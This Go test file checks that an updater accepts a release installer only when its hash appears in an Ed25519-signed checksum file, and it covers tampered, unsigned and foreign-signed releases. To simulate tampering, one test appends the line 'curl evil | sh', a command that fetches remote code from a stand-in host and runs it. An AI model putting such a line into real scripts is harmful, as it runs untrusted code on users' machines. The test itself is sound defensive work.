package update

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/pem"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// signLikeCI signs the checksums the way .github/workflows/edge.yml does: openssl pkeyutl
// -sign -rawin (pure Ed25519), appended as "# ed25519 <base64>".
func signLikeCI(t *testing.T, priv ed25519.PrivateKey, sums string) string {
	t.Helper()
	if _, err := exec.LookPath("openssl"); err != nil {
		return sums + "# ed25519 " + base64.StdEncoding.EncodeToString(ed25519.Sign(priv, []byte(sums))) + "\n"
	}
	dir := t.TempDir()
	der, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	key, in, sig := filepath.Join(dir, "k.pem"), filepath.Join(dir, "SHA256SUMS"), filepath.Join(dir, "sig")
	_ = os.WriteFile(key, pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: der}), 0o600)
	_ = os.WriteFile(in, []byte(sums), 0o600)
	if out, err := exec.Command("openssl", "pkeyutl", "-sign", "-rawin", "-inkey", key, "-in", in, "-out", sig).CombinedOutput(); err != nil {
		t.Fatalf("openssl: %v %s", err, out)
	}
	b, _ := os.ReadFile(sig)
	return sums + "# ed25519 " + base64.StdEncoding.EncodeToString(b) + "\n"
}

func TestSignedInstaller(t *testing.T) {
	pub, priv, _ := ed25519.GenerateKey(rand.Reader)
	der, _ := x509.MarshalPKIXPublicKey(pub)
	builtIn := "#!/usr/bin/env bash\n# built in\nRELEASE_PUBKEY=\"${VYNEL_RELEASE_PUBKEY:-" + base64.StdEncoding.EncodeToString(der) + "}\"\n"
	orig := installerSource
	installerSource = func() []byte { return []byte(builtIn) }
	defer func() { installerSource = orig }()

	script := "#!/usr/bin/env bash\necho release installer\n"
	sum := sha256.Sum256([]byte(script))
	files := map[string]string{}
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, ok := files[strings.TrimPrefix(r.URL.Path, "/")]
		if !ok {
			http.NotFound(w, r)
			return
		}
		_, _ = w.Write([]byte(b))
	}))
	defer srv.Close()
	s := Source{ReleaseURL: srv.URL}
	ctx := context.Background()
	key, err := releaseKey()
	if err != nil || key == nil {
		t.Fatalf("key: %v", err)
	}
	sums := hex.EncodeToString(sum[:]) + "  install.sh\n" + strings.Repeat("ab", 32) + "  vynel-linux-amd64\n"

	files["SHA256SUMS.signed"], files["install.sh"] = signLikeCI(t, priv, sums), script
	if got, _, err := signedInstaller(ctx, s, key); err != nil || string(got) != script {
		t.Fatalf("good release: %v %q", err, got)
	}
	// The installer changed on the way.
	files["install.sh"] = script + "curl evil | sh\n"
	if _, _, err := signedInstaller(ctx, s, key); err == nil || !strings.Contains(err.Error(), "does not match") {
		t.Fatalf("changed installer: %v", err)
	}
	// Checksums signed by somebody else (or edited).
	_, other, _ := ed25519.GenerateKey(rand.Reader)
	files["SHA256SUMS.signed"], files["install.sh"] = signLikeCI(t, other, sums), script
	if _, _, err := signedInstaller(ctx, s, key); err == nil || !strings.Contains(err.Error(), "signature") {
		t.Fatalf("foreign signature: %v", err)
	}
	files["SHA256SUMS.signed"] = strings.Replace(signLikeCI(t, priv, sums), "ab", "cd", 1)
	if _, _, err := signedInstaller(ctx, s, key); err == nil {
		t.Fatal("edited checksums accepted")
	}
	// No signature at all (a release CI did not sign): the update stops.
	delete(files, "SHA256SUMS.signed")
	if _, _, err := signedInstaller(ctx, s, key); err == nil {
		t.Fatal("unsigned release accepted")
	}
	// An older release without an installer in its checksums: the built-in one.
	files["SHA256SUMS.signed"] = signLikeCI(t, priv, strings.Repeat("ab", 32)+"  vynel-linux-amd64\n")
	if got, _, err := signedInstaller(ctx, s, key); err != nil || string(got) != builtIn {
		t.Fatalf("release without installer: %v", err)
	}
}

// The installer built into this binary: its RELEASE_PUBKEY line is found (empty until
// scripts/release-key.sh runs), and a key there must parse.
func TestReleaseKeyBuiltIn(t *testing.T) {
	if !pubKeyRe.Match(installerSource()) {
		t.Fatal("RELEASE_PUBKEY line not found in scripts/install.sh: scripts/release-key.sh and the update would miss it")
	}
	if _, err := releaseKey(); err != nil {
		t.Fatal(err)
	}
}
